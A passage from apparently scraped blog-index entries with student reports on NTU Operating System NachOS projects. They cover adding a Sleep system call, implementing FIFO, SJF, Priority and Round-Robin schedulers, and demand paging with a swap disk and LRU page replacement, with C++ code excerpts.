PAGE_OCCU) idx++; AddrSpace::PhyPageStatus[idx] = PAGE_OCCU; AddrSpace::NumFreePages--; // Clean the page that\u0026#39;ll be used soon bzero(\u0026amp;kernel-\u0026gt;machine-\u0026gt;mainMemory[idx * PageSize], PageSize); pageTable[i].physicalPage = idx; pageTable[i].valid = true; pageTable[i].use = false; pageTable[i].dirty = false; pageTable[i].readOnly = false; } Change Reading Position - Revise at addrspace.cc AddrSpace::Load function\n// then, copy in the code and data segments into memory if (noffH.code.size \u0026gt; 0) { DEBUG(dbgAddr, \u0026#34;Initializing code segment.\u0026#34;); DEBUG(dbgAddr, noffH.code.virtualAddr \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; noffH.code.size); executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[pageTable[noffH.code.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.code.size, noffH.code.inFileAddr); } if (noffH.initData.size \u0026gt; 0) { DEBUG(dbgAddr, \u0026#34;Initializing data segment.\u0026#34;); DEBUG(dbgAddr, noffH.initData.virtualAddr \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; noffH.initData.size); executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[pageTable[noffH.initData.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.initData.size, noffH.initData.inFileAddr); } When the process is loaded in memory, we must fill in the physicalPage corresponding to pageTable[]. We used linear time to search the first free page and fill it in. When load it successfully, we can start to execute then we must compute the entry point which is main memory address. First, computing which pages(i-th page) and times PageSize equals page base. Second, page offset is code.address % PageSize Finally, the entry point = page base + page offset\nFree Physical Pages\n// Free the physical page that this program used for(int i = 0; i \u0026lt; numPages; i++) { AddrSpace::PhyPageStatus[pageTable[i].physicalPage] = PAGE_FREE; AddrSpace::NumFreePages++; } delete pageTable; Q3: Experiment result * Q4: Discussion ■ The most difficaulty that I encountered is previewing most of the background knowledge to complete this project. Most of these knowlege have not been taught yet, so I must be self-learning. Reference # page1 page2 "},{"id":201,"href":"/security/course/ntu-os/ntu-operating-system-project-2/","title":"NTU Operating System Project 2","section":"Securities","content":" NTU Operating System Project 2 # tags: NTU_OS Operating System NachOS CPU Scheduling System Call # [TOC]\nMotivation # For the first task, We\u0026rsquo;d like to add sleep() function in system call that can help us call sleep in our program. For the second task, we\u0026rsquo;d like to implement CPU scheduling by FIFO(First-In-First-Out), SJF(Shortest-Job-First), Priority, RR(Round-Robin), and multi-level queue. Implementation # Task1 - System Call # First of all, we need to define a new token, SC_Sleep, that compiler(scanner) can recognize in code/userprog/syscall.h.\nSo, we have to assign a number to SC_Sleep that it can return the value.\n... #define SC_ThreadFork\t9 #define SC_ThreadYield\t10 #define SC_PrintInt\t11 /* ********************************************* Self-defined ********************************************* */ #define SC_Sleep 12. ... Then, observe the other define words like SC_PrintInt in the same file. You can see there\u0026rsquo;re lots of declaration function for each system call such as void PrintInt(int number); or void ThreadFork(void (*func)());,etc.. So, we must declare a function for sleep system call.\n... /* ********************************************* Self-defined ********************************************* */ void Sleep(int number); #endif /* IN_ASM */ ... According to the assignment description file, another file should be checked is start.s in test/start.s.\nAccording to the comment above this file, it\u0026rsquo;s a file to assist system calls to NachOS kernel by assembly language.\nStart.s\nAssembly language assist for user programs running on top of Nachos. Since we don\u0026rsquo;t want to pull in the entire C library, we define what we need for a user program here, namely Start and the system calls. System call stubs:\nAssembly language assist to make system calls to the Nachos kernel. There is one stub per system call, that places the code for the system call into register r2, and leaves the arguments to the system call alone (in other words, arg1 is in r4, arg2 is in r5, arg3 is in r6, arg4 is in r7) The return value is in r2. This follows the standard C calling convention on the MIPS. /* ********************************************* Self-defined ********************************************* */ .globl Sleep\t/* Set Sleep to a global symbol that can be found in real c++ code properly */ .ent Sleep\t/* Set the entry point for Sleep */ Sleep: addiu $2,$0,SC_Sleep syscall j $31 .end Sleep From assignment description file, we should catch the exception situation by userprog/exception.cc. So, we need to define a new case in this file.\nAccording to the comment above in exception.cc\nEntry point into the Nachos kernel from user programs. There are two kinds of things that can cause control to transfer back to here from user code:\nsyscall \u0026ndash; The user code explicitly requests to call a procedure in the Nachos kernel. Right now, the only function we support is \u0026ldquo;Halt\u0026rdquo;. exceptions \u0026ndash; The user code does something that the CPU can\u0026rsquo;t handle. For instance, accessing memory that doesn\u0026rsquo;t exist, arithmetic errors, etc. \u0026hellip;\nExceptionHandler\nEntry point into the Nachos kernel. Called when a user program is executing, and either does a syscall, or generates an addressing or arithmetic exception. For system calls, the following is the calling convention: system call code \u0026ndash; r2 arg1 \u0026ndash; r4 arg2 \u0026ndash; r5 arg3 \u0026ndash; r6 arg4 \u0026ndash; r7 The result of the system call, if any, must be put back into r2. And don\u0026rsquo;t forget to increment the pc before returning. (Or else you\u0026rsquo;ll loop making the same system call forever! \u0026ldquo;which\u0026rdquo; is the kind of exception. The list of possible exceptions are in machine.h. So, observe the previous case, SC_PrintInt, we can guess the value stored in kernel-\u0026gt;machine-\u0026gt;Readgister(4). The code is like this\u0026hellip;\n/* ********************************************* Self-defined ********************************************* */ case SC_Sleep: val=kernel-\u0026gt;machine-\u0026gt;ReadRegister(4); cout \u0026lt;\u0026lt; \u0026#34;Sleep a while:\u0026#34; \u0026lt;\u0026lt;val \u0026lt;\u0026lt; \u0026#34;(ms)\u0026#34; \u0026lt;\u0026lt; endl; return; But, this code can not really stop the executing instead of printing out a normal message. So, refer to the assignment note, we should check kernel-\u0026gt;alarm-\u0026gt;WaitUntil() function that\u0026rsquo;ll really implement sleep function in threads/alarm.h. The result after adding the code is just like\u0026hellip;\n/* ********************************************* Self-defined ********************************************* */ case SC_Sleep: val=kernel-\u0026gt;machine-\u0026gt;ReadRegister(4); cout \u0026lt;\u0026lt; \u0026#34;Sleep a while:\u0026#34; \u0026lt;\u0026lt;val \u0026lt;\u0026lt; \u0026#34;(ms)\u0026#34; \u0026lt;\u0026lt; endl; kernel-\u0026gt;alarm-\u0026gt;WaitUntil(val); return; *More info about WainUntil() function and interrupt, you can check out here\nThe most important part\nDefine a class named sleepList in alarm.h and implement the methods in alarm.cc. All the other description can check out OS-NachOS-HW1 and use VSode can be more clearly. Lazy to write it down.\nRefer to OS-NachOS-HW1, you can write your own testing case or just use the ready-made test case on the web. Note that you must revise Makefile in code/test/Makefile like this\u0026hellip;\nall: halt shell matmult sort test1 test2 sleep1 sleep2 ... sleep1: sleep1.o start.o $(LD) $(LDFLAGS) start.o sleep1.o -o sleep1.coff ../bin/coff2noff sleep1.coff sleep1 sleep2: sleep2.o start.o $(LD) $(LDFLAGS) start.o sleep2.o -o sleep2.coff ../bin/coff2noff sleep2.coff sleep2 *Note that you must use tab in Makefile.\n*The purpose of these manipulation is when you use make command in code/Makefile. It\u0026rsquo;ll execute all Makefile that exist in each folder. It can be observed in code/Makefile\nMAKE = make LPR = lpr all: cd threads; $(MAKE) depend cd threads; $(MAKE) nachos cd userprog; $(MAKE) depend cd userprog; $(MAKE) nachos cd filesys; $(MAKE) depend cd filesys; $(MAKE) nachos cd network; $(MAKE) depend cd network; $(MAKE) nachos cd bin; $(MAKE) all cd test; make all *Error message I encountered:\n... ../bin/coff2noff halt.coff halt make[1]: execvp: ../bin/coff2noff: Permission denied make[1]: *** [halt] Error 127 make[1]: Leaving directory `/home/sbk/NTU/Operating System/Project2/nachos-4.0/code/test\u0026#39; make: *** [all] Error 2 According to Why do I get permission denied when I try use \u0026ldquo;make\u0026rdquo; to install something? page on StackOverflow, just use chmod 777 ./bin/coff2noff in ./code folder.\nTask2 - CPU Scheduling # Testing # threads/thread.cc - create a test case\n... void threadBody() { Thread *thread = kernel-\u0026gt;currentThread; while (thread-\u0026gt;getBurstTime() \u0026gt; 0) { thread-\u0026gt;setBurstTime(thread-\u0026gt;getBurstTime() - 1); kernel-\u0026gt;interrupt-\u0026gt;OneTick(); printf(\u0026#34;%s: remaining %d\\n\u0026#34;, kernel-\u0026gt;currentThread-\u0026gt;getName(), kernel-\u0026gt;currentThread-\u0026gt;getBurstTime()); } } void Thread::SchedulingTest() { const int thread_num = 4; char *name[thread_num] = {\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;}; int thread_priority[thread_num] = {5, 1, 3, 2}; int thread_burst[thread_num] = {3, 9, 7, 3}; Thread *t; for (int i = 0; i \u0026lt; thread_num; i ++) { t = new Thread(name[i]); t-\u0026gt;setPriority(thread_priority[i]); t-\u0026gt;setBurstTime(thread_burst[i]); t-\u0026gt;Fork((VoidFunctionPtr) threadBody, (void *)NULL); } kernel-\u0026gt;currentThread-\u0026gt;Yield(); } threads/thread.h - define various method in header files and implement these method in c file\nclass Thread { private: ... public: ... void setBurstTime(int t) {burstTime = t;} int getBurstTime()\t{return burstTime;} void setStartTime(int t)\t{startTime = t;} int getStartTime()\t{return startTime;} void setPriority(int t)\t{execPriority = t;} int getPriority()\t{return execPriority;} static void SchedulingTest(); ... private: int burstTime;\t// predicted burst time int startTime;\t// the start time of the thread int execPriority;\t// the execute priority of the thread ... }; threads/kernel.cc - add SchedulingTest() function that we\u0026rsquo;ve defined in thread.h in ThreadKernel\nvoid ThreadedKernel::SelfTest() { ... LibSelfTest();\t// test library routines currentThread-\u0026gt;SelfTest();\t// test thread switching Thread::SchedulingTest();\t// Add this line // test semaphore operation semaphore = new Semaphore(\u0026#34;test\u0026#34;, 0); ... } threads/main.cc - if we want to test all types of scheduler, then we need to set extra parameter to choose the type just shown as below\n$ cd code/threads $ ./nachos FCFS $ ./nachos SJF $ ./nachos Priority $ ./nachos RR int main(int argc, char **argv) { ... DEBUG(dbgThread, \u0026#34;Entering main\u0026#34;); SchedulerType type = RR; if(strcmp(argv[1], \u0026#34;FCFS\u0026#34;) == 0) type = FIFO; else if (strcmp(argv[1], \u0026#34;SJF\u0026#34;) == 0) type = SJF; else if (strcmp(argv[1], \u0026#34;PRIORITY\u0026#34;) == 0) type = Priority; else if (strcmp(argv[1], \u0026#34;RR\u0026#34;) == 0) type = RR; kernel = new KernelType(argc, argv); kernel-\u0026gt;Initialize(type); // Need to add \u0026#39;type\u0026#39; as parameter here ... } Implement # machine/machine.h - let NumPhysPage bigger to avoid segmentation fault (core dumped) which is an error message about memory allocation (note that this error is hard to debug).\nconst unsigned int PageSize = 128; // set the page size equal to // the disk sector size, for simplicity const unsigned int NumPhysPages = 256;\t// Change this line const int MemorySize = (NumPhysPages * PageSize); const int TLBSize = 4;\t// if there is a TLB, make it small threads/scheduler.h - define additional scheduler type named FIFO(First-In-First-Out) and get type method in header file\nenum SchedulerType { RR, // Round Robin SJF, Priority, FIFO\t// Add this line }; class Scheduler { public: ... ~Scheduler(); Scheduler(SchedulerType type);\t// Initialize list of ready threads SchedulerType getSchedulerType() {return schedulerType;} void setSchedulerType(SchedulerType t) {schedulerType = t;} ... }; threads/scheduler.cc - implement each scheduler type here\nint SJFCompare(Thread *a, Thread *b) { if(a-\u0026gt;getBurstTime() == b-\u0026gt;getBurstTime()) return 0; return a-\u0026gt;getBurstTime() \u0026gt; b-\u0026gt;getBurstTime() ? 1 : -1; } int PriorityCompare(Thread *a, Thread *b) { if(a-\u0026gt;getPriority() == b-\u0026gt;getPriority()) return 0; return a-\u0026gt;getPriority() \u0026gt; b-\u0026gt;getPriority() ? 1 : -1; } int FIFOCompare(Thread *a, Thread *b) { return 1; } //---------------------------------------------------------------------- // Scheduler::Scheduler // Initialize the list of ready but not running threads. //\tInitially, no ready threads. //---------------------------------------------------------------------- Scheduler::Scheduler() { Scheduler(RR); } Scheduler::Scheduler(SchedulerType type) { schedulerType = type; // readyList = new List\u0026lt;Thread *\u0026gt;; switch(schedulerType) { case RR: readyList = new List\u0026lt;Thread *\u0026gt;; break; case SJF: readyList = new SortedList\u0026lt;Thread *\u0026gt;(SJFCompare); break; case Priority: readyList = new SortedList\u0026lt;Thread *\u0026gt;(PriorityCompare); break; case FIFO: readyList = new SortedList\u0026lt;Thread *\u0026gt;(FIFOCompare); } toBeDestroyed = NULL; } threads/alarm.cc - if you want to implement preemptive, you need to determine whether call interrupt-\u0026gt;YieldOnReturn() or not in Alarm::CallBack()\nAnd for the computing burst time, if you decide to use running time estimation, you need to compute in Alarm::WaitUntil() shown as below\nvoid Alarm::CallBack() { ... if (status == IdleMode \u0026amp;\u0026amp; !woken \u0026amp;\u0026amp; _sleepList.IsEmpty()) ... else // there\u0026#39;s someone to preempt { if(kernel-\u0026gt;scheduler-\u0026gt;getSchedulerType() == RR || kernel-\u0026gt;scheduler-\u0026gt;getSchedulerType() == Priority ) { cout \u0026lt;\u0026lt; \u0026#34;=== interrupt-\u0026gt;YieldOnReturn ===\u0026#34; \u0026lt;\u0026lt; endl; interrupt-\u0026gt;YieldOnReturn(); } } } void Alarm::WaitUntil(int x) { ... Thread* t = kernel-\u0026gt;currentThread; int worktime = kernel-\u0026gt;stats-\u0026gt;userTicks - t-\u0026gt;getStartTime(); t-\u0026gt;setBurstTime(t-\u0026gt;getBurstTime() + worktime); t-\u0026gt;setStartTime(kernel-\u0026gt;stats-\u0026gt;userTicks); ... } Revise Some files # You have to include scheduler.h to each header file that we\u0026rsquo;ll use that including kernel.h, userkernel.h, and netkernel.h. Then initial the scheduler type in each c file such as kernel.cc, userkernel.cc, and netkernel.cc. Most of them are very similar.\nthreads/kernel.h\n... class ThreadedKernel { public: ... void Initialize(); void Initialize(SchedulerType type); ... }; threads/kernel.cc\nvoid ThreadedKernel::Initialize() { Initialize(RR); } void ThreadedKernel::Initialize(SchedulerType type)// { stats = new Statistics();\t// collect statistics interrupt = new Interrupt;\t// start up interrupt handling scheduler = new Scheduler(type);\t// initialize the ready queue alarm = new Alarm(randomSlice);\t// start up time slicing // We didn\u0026#39;t explicitly allocate the current thread we are running in. // But if it ever tries to give up the CPU, we better have a Thread // object to save its state. currentThread = new Thread(\u0026#34;main\u0026#34;);\tcurrentThread-\u0026gt;setStatus(RUNNING); interrupt-\u0026gt;Enable(); } userprog/userkernel.h\n#include \u0026#34;../threads/scheduler.h\u0026#34; class UserProgKernel : public ThreadedKernel { public: ... void Initialize(); void Initialize(SchedulerType type); ... }; userprog/userkernel.cc\nvoid UserProgKernel::Initialize() { Initialize(RR); } void UserProgKernel::Initialize(SchedulerType type)// { ThreadedKernel::Initialize(type);\t// init multithreading machine = new Machine(debugUserProg); fileSystem = new FileSystem(); #ifdef FILESYS synchDisk = new SynchDisk(\u0026#34;New SynchDisk\u0026#34;); #endif // FILESYS } network/netkernel.h\n#include \u0026#34;../threads/scheduler.h\u0026#34; class NetKernel : public UserProgKernel { public: ... void Initialize(); void Initialize(SchedulerType type); ... }; network/netkernel.cc\nvoid NetKernel::Initialize() { Initialize(RR); } void NetKernel::Initialize(SchedulerType type)// { UserProgKernel::Initialize(type);\t// init other kernel data structs postOfficeIn = new PostOfficeInput(10); postOfficeOut = new PostOfficeOutput(reliability, 10); } Result # Task 1 Result I create another test case named Sleep3.c and aim to test the sleep time 10 times longer than Sleep1.c and Sleep2.c is aim to test the time that 100 times shorter than Sleep1.c.\nsleep1\n#include \u0026#34;syscall.h\u0026#34; main() { int i; for(i = 0; i \u0026lt; 5; i++) { Sleep(1000000); PrintInt(2222); } return 0; } Sleep2\n#include \u0026#34;syscall.h\u0026#34; main() { int i; for(i = 0; i \u0026lt; 5; i++) { Sleep(10000); PrintInt(99999); } return 0; } Sleep3\n#include \u0026#34;syscall.h\u0026#34; main() { int i; for(i = 0; i \u0026lt; 5; i++) { Sleep(10000000); PrintInt(666); } return 0; } In Sleep1.c, you can feel the sleep function working clearly that compare with a normal code without sleep function or compare with a shorter sleep time such as Sleep2.c And in Sleep3.c, you can feel the sleeping time much more longer that what we expected but just execute 3 times PrintInt function.(No idea why)\nTask 2 Result\nResult of real multi thread testing Result of FCFS Result of RR Result of SJF Result of priority Reference # OS-NachOS-HW1 向 NachOS 4.0 作業進發 (2) OS 2020 HW2 Nachos Report "},{"id":202,"href":"/security/course/ntu-os/ntu-operating-system-project-3/","title":"NTU Operating System Project 3","section":"Securities","content":" NTU Operating System Project 3 # tags: NTU_OS Operating System NachOS Memory Management # [TOC]\nDescription First # I used the code from Project2 directly and obtained the correct value, 1 and 7220, by the command ./nachos -e ../test/sort -e ../test/matmult respectively. After debugging a while, I knew what\u0026rsquo;s the matter. In project2, I set const unsigned int NumPhysPages = 256; so that it can handle huge computing resource. In order to address this project, we must change it back to 32.\nMotivation # Normally speaking, if you follow the command ./nachos -e ../test/matmult and ./nachos -e ../test/sort in Project2, you\u0026rsquo;ll get Total threads number is 1 Thread ../test/sort is executing. Assertion failed: line 118 file ../userprog/addrspace.cc Aborted (core dumped) Total threads number is 1 Thread ../test/matmult is executing. Assertion failed: line 118 file ../userprog/addrspace.cc Aborted (core dumped) Our goal is to obtain the correct outcome 1 and 7220 from /test/sort and /test/matmult respectively that shown as below $ ./nachos -e ../test/sort -e ../test/matmult Total threads number is 2 Thread ../test/sort is executing. Thread ../test/matmult is executing. return value:7220 return value:1 No threads ready or runnable, and no pending interrupts. Assuming the program completed. Machine halting! Ticks: total 43818400, idle 40, system 4381880, user 39436480 Disk I/O: reads 0, writes 0 Console I/O: reads 0, writes 0 Paging: faults 0 Network I/O: packets received 0, sent 0 Now, let\u0026rsquo;s try to analyze the problem. NachOS has physical memory limitation, so that it cannot handle the program that needs huge memory resource such as sort.c and matmult.c. Thus, we can utilize Demand Paging to address it → realize a virtual memory if the main memory has no space When the space in main memory is enough, pages will be stored in main memory. If the space is insufficient, the pages and data will swap out. When there is valid space, i.e. the space is released, and the data is needed, the pages and data will then swap in main memory. The scheduling method of the page replacement algorithm is implemented by LRU(Least Recently Used). - by wangssuming\nImplementation # /code/userprog/userkernel.h create a new SynchDisk called SwapDisk and replace debugUserProg from private to public\nclass UserProgKernel : public ThreadedKernel { public: ... /*-----------------------Homework for Memory Management------------------------*/ // Create a new SynchDisk called SwapDisk to simulate the secondary storage SynchDisk *SwapDisk; // SwapDisk saves pages if main memory is not enough bool debugUserProg;\t// single step user program /*-----------------------Homework for Memory Management------------------------*/ Machine *machine; FileSystem *fileSystem; ... private: ... /*-----------------------Homework for Memory Management------------------------*/ // No longer needed for HW3 //bool debugUserProg;\t// single step user program /*-----------------------Homework for Memory Management------------------------*/ Thread* t[10]; ... }; /code/userprog/userkernel.cc Initialize SwapDisk\nvoid UserProgKernel::Initialize() { /*-----------------------Homework for Memory Management------------------------*/ ThreadedKernel::Initialize(RR); // Initialized SwapDisk machine = new Machine(debugUserProg); fileSystem = new FileSystem(); SwapDisk = new SynchDisk(\u0026#34;New SwapDisk\u0026#34;);// Swap disk for virtual memory #ifdef FILESYS synchDisk = new SynchDisk(\u0026#34;New SynchDisk\u0026#34;); #endif // FILESYS /*-----------------------Homework for Memory Management------------------------*/ } void UserProgKernel::Initialize(SchedulerType type)// { ... /*-----------------------Homework for Memory Management------------------------*/ SwapDisk = new SynchDisk(\u0026#34;New SwapDisk\u0026#34;);// Swap disk for virtual memory /*-----------------------Homework for Memory Management------------------------*/ #ifdef FILESYS ... }; /code/machine/machine.h Defined lots of variable in Machine class contained UsedPhyPage to record whether the physical memory is used or not, UsedVirtualPage to record whether the virtual memory is used or not, etc.\nclass Instruction; class Interrupt; class Machine { public: ... TranslationEntry *pageTable; unsigned int pageTableSize; bool ReadMem(int addr, int size, int* value); /*-----------------------Homework for Memory Management------------------------*/ bool UsedPhyPage[NumPhysPages]; //record the pages in the main memory bool UsedVirtualPage[NumPhysPages]; //record the pages in the virtual memory int ID_number; // machine ID int PhyPageInfo[NumPhysPages]; //record physical page info (ID) TranslationEntry *main_tab[NumPhysPages]; // pagetable /*-----------------------Homework for Memory Management------------------------*/ private: ... }; /code/userprog/addrspace.cc\nIn line 45\nSince we are handling virtual memory, the ASSERT to guarantee the number of pages does not exceed the number of physical pages in main memory in /code/userprog/addrspace.cc is no longer needed. - by pai445\nThe for loop in line 79 is used to find an available page for current process. The while loop in line 82 is as similar as project2 that used variable j to find free memory page.\nThere are two different cases in the following. When the main memory still have empty frame, then we can put the page into the main memory and update the information to the page table. This step is achieved by the function ReadAt. The other case will be the main memory is fulled. Then we have check the available virtual memory space by the similar while loop and write the page in to SwapDisk by the WriteSector function. - by pai445\nExecute function in line 135 and SaveState in line 147 We use a flag, pageTable_is_load, defined in /code/userprog/addrspace.h to check whether the page table is successfully loaded to make the context-switch work.\n#define PAGE_OCCU true #define PAGE_FREE false /*-----------------------Homework for Memory Management------------------------*/ // There\u0026#39;s no longer needed in HW3 // bool AddrSpace::PhyPageStatus[NumPhysPages] = {PAGE_FREE}; // int AddrSpace::NumFreePages = NumPhysPages; /*-----------------------Homework for Memory Management------------------------*/ AddrSpace::AddrSpace() { /*-----------------------Homework for Memory Management------------------------*/ ID=(kernel-\u0026gt;machine-\u0026gt;ID_number)++; kernel-\u0026gt;machine-\u0026gt;ID_number=(kernel-\u0026gt;machine-\u0026gt;ID_number)++; /*-----------------------Homework for Memory Management------------------------*/ ... } AddrSpace::~AddrSpace() { // Free the physical page that this program used /*-----------------------Homework for Memory Management------------------------*/ // No longer needed for HW3 // for(int i = 0; i \u0026lt; numPages; i++) // { // AddrSpace::PhyPageStatus[pageTable[i].physicalPage] = PAGE_FREE; // AddrSpace::NumFreePages++; // } /*-----------------------Homework for Memory Management------------------------*/ delete pageTable; } bool AddrSpace::Load(char *fileName) { OpenFile *executable = kernel-\u0026gt;fileSystem-\u0026gt;Open(fileName); NoffHeader noffH; unsigned int size; /*-----------------------Homework for Memory Management------------------------*/ unsigned int tmp; /*-----------------------Homework for Memory Management------------------------*/ ... size = numPages * PageSize; /*-----------------------Homework for Memory Management------------------------*/ /* For HW3 is no longer needed */ // ASSERT(numPages \u0026lt;= NumPhysPages);\t// check we\u0026#39;re not trying // to run anything too big -- // at least until we have // virtual memory // Allocate pageTable = new TranslationEntry[numPages]; // No longer needed for HW3 /*for(unsigned int i = 0, idx = 0; i \u0026lt; numPages; i++) { pageTable[i].virtualPage = i; while(idx \u0026lt; NumPhysPages \u0026amp;\u0026amp; AddrSpace::PhyPageStatus[idx] == PAGE_OCCU) idx++; AddrSpace::PhyPageStatus[idx] = PAGE_OCCU; AddrSpace::NumFreePages--; // Clean the page that\u0026#39;ll be used soon bzero(\u0026amp;kernel-\u0026gt;machine-\u0026gt;mainMemory[idx * PageSize], PageSize); pageTable[i].physicalPage = idx; pageTable[i].valid = true; pageTable[i].use = false; pageTable[i].dirty = false; pageTable[i].readOnly = false; }*/ /*-----------------------Homework for Memory Management------------------------*/ DEBUG(dbgAddr, \u0026#34;Initializing address space: \u0026#34; \u0026lt;\u0026lt; numPages \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; size); if (noffH.code.size \u0026gt; 0) { /*-----------------------Homework for Multithread------------------------*/; // For HW3 is no longer needed // DEBUG(dbgAddr, \u0026#34;Initializing code segment.\u0026#34;); // DEBUG(dbgAddr, noffH.code.virtualAddr \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; noffH.code.size) // executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[pageTable[noffH.code.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.code.size, noffH.code.inFileAddr); // executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[noffH.code.virtualAddr]), noffH.code.size, noffH.code.inFileAddr); for(unsigned int j=0,i=0;i \u0026lt; numPages ;i++) { j=0; while(kernel-\u0026gt;machine-\u0026gt;UsedPhyPage[j]!=FALSE\u0026amp;\u0026amp;j\u0026lt;NumPhysPages){j++;} // main memory is enough, put the page to main memory if(j\u0026lt;NumPhysPages) { kernel-\u0026gt;machine-\u0026gt;UsedPhyPage[j]=TRUE; kernel-\u0026gt;machine-\u0026gt;PhyPageInfo[j]=ID; kernel-\u0026gt;machine-\u0026gt;main_tab[j]=\u0026amp;pageTable[i]; pageTable[i].physicalPage = j; pageTable[i].valid = TRUE; pageTable[i].use = FALSE; pageTable[i].dirty = FALSE; pageTable[i].readOnly = FALSE; pageTable[i].ID =ID; pageTable[i].LRU_counter++; // LRU counter when save in memory executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[j*PageSize]),PageSize, noffH.code.inFileAddr+(i*PageSize)); } // main memory is not enough, use virtual memory else { char *buffer; buffer = new char[PageSize]; tmp=0; while(kernel-\u0026gt;machine-\u0026gt;UsedVirtualPage[tmp]!=FALSE){tmp++;} kernel-\u0026gt;machine-\u0026gt;UsedVirtualPage[tmp]=true; pageTable[i].virtualPage=tmp; //record the virtual page we save pageTable[i].valid = FALSE; //not load in main memory pageTable[i].use = FALSE; pageTable[i].dirty = FALSE; pageTable[i].readOnly = FALSE; pageTable[i].ID =ID; executable-\u0026gt;ReadAt(buffer,PageSize, noffH.code.inFileAddr+(i*PageSize)); kernel-\u0026gt;SwapDisk-\u0026gt;WriteSector(tmp,buffer); // write in virtual memory (SwapDisk) } } /*-----------------------Homework for Memory Management------------------------*/ } /*-----------------------Homework for Memory Management------------------------*/ if (noffH.initData.size \u0026gt; 0) { // For HW1, it\u0026#39;s needed, but not in HW3 // DEBUG(dbgAddr, \u0026#34;Initializing data segment.\u0026#34;); // DEBUG(dbgAddr, noffH.initData.virtualAddr \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; noffH.initData.size); // executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[pageTable[noffH.initData.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.initData.size, noffH.initData.inFileAddr); // For HW3, it\u0026#39;s needed, but not in HW1 executable-\u0026gt;ReadAt(\u0026amp;(kernel-\u0026gt;machine-\u0026gt;mainMemory[noffH.initData.virtualAddr]),noffH.initData.size, noffH.initData.inFileAddr); } /*-----------------------Homework for Memory Management------------------------*/ delete executable; // close file return TRUE; // success } void AddrSpace::Execute(char *fileName) { /*-----------------------Homework for Memory Management------------------------*/ pageTable_is_load=FALSE; /*-----------------------Homework for Memory Management------------------------*/ if (!Load(fileName)) ... /*-----------------------Homework for Memory Management------------------------*/ pageTable_is_load=TRUE; /*-----------------------Homework for Memory Management------------------------*/ ... } void AddrSpace::SaveState() { /*-----------------------Homework for Memory Management------------------------*/ if(pageTable_is_load) { pageTable=kernel-\u0026gt;machine-\u0026gt;pageTable; numPages=kernel-\u0026gt;machine-\u0026gt;pageTableSize; } /*-----------------------Homework for Memory Management------------------------*/ } /code/userprog/addrspace.h Defined variable ID and pageTable_is_load\nclass AddrSpace { public: ... /*-----------------------Homework for Memory Management------------------------*/ int ID; /*-----------------------Homework for Memory Management------------------------*/ private: ... static int NumFreePages; /*-----------------------Homework for Memory Management------------------------*/ bool pageTable_is_load; /*-----------------------Homework for Memory Management------------------------*/ }; Now, the OS can implement that swap the data from main memory to virtual memory when main memory is full. For the following step, we have to implement page replacement algorithms, Least Recently Used (LRU).\n/code/machine/translate.h\nWe implement by a hardware counter LRU_counter in /code/machine/traslate.h. - by pai445\nclass TranslationEntry { public: ... /*-----------------------Homework for Memory Management------------------------*/ int LRU_counter; // counter for LRU int ID; // page table ID /*-----------------------Homework for Memory Management------------------------*/ }; /code/machine/translate.cc\nFirst, we check the valid-invalid bit of the page table. If is not valid, it means the page is not in the main memory. Hence, we need to load from the secondary storage. There are two cases that may happen. First, if there are some empty frame in the main memory, then we can just load the page into it. The other case is that the main memory is fulled. In this cases, we create two buffers and runs least recently used (LRU) algorithm to find the victim. The ReadSector and WriteSector are used to read/write the temporarily saved pages found by the LRU algorithm. The victim is pull out from the main memory, and then swapped by our page into the corresponding frame. The page table will be updated correspondingly in both cases. In our implementation, LRU will perform linear search on LRU_counter to find the least recently used page. - by pai445\nIn previous TA\u0026rsquo;s Project documentation, we used kernel-\u0026gt;swap-\u0026gt;WriteSector and kernel-\u0026gt;swap-\u0026gt;ReadSector to store the virtual memory from hard disk(swap is a object of SynchDisk) Therefore, in line 34-35, we used ReadSector to read pageTable[vpn].virtualPage and store into the buffer. Then use bcopy function to move byte sequence from src→buffer to dest→\u0026amp;mainMemory[j*PageSize] with size=PageSize only if the main memory is sufficient. Reference[1] In line 63-66. If the main memory is full, then we used LRU algorithm to find the least recently used memory and switch to disk and replace an desired data to main memory. That is, memory section was found by LRU algorithm→buffer1→virtual memory and desired memory section stored in virtual memory→buffer2→main memory ExceptionType Machine::Translate(int virtAddr, int* physAddr, int size, bool writing) { unsigned int pageFrame; /*-----------------------Homework for Memory Management------------------------*/ int victim;///find the page victim unsigned int j; /*-----------------------Homework for Memory Management------------------------*/ DEBUG(dbgAddr, \u0026#34;\\tTranslate \u0026#34; \u0026lt;\u0026lt; virtAddr \u0026lt;\u0026lt; (writing ? \u0026#34; , write\u0026#34; : \u0026#34; , read\u0026#34;)); ... if (tlb == NULL) {\t// =\u0026gt; page table =\u0026gt; vpn is index into table if (vpn \u0026gt;= pageTableSize){...} else if (!pageTable[vpn].valid) { /*-----------------------Homework for Memory Management------------------------*/ // For HW3, these two lines are no longer needed // DEBUG(dbgAddr, \u0026#34;Invalid virtual page # \u0026#34; \u0026lt;\u0026lt; virtAddr); // return PageFaultException; kernel-\u0026gt;stats-\u0026gt;numPageFaults++; // page fault j=0; while(kernel-\u0026gt;machine-\u0026gt;UsedPhyPage[j]!=FALSE\u0026amp;\u0026amp;j\u0026lt;NumPhysPages){j++;} // load the 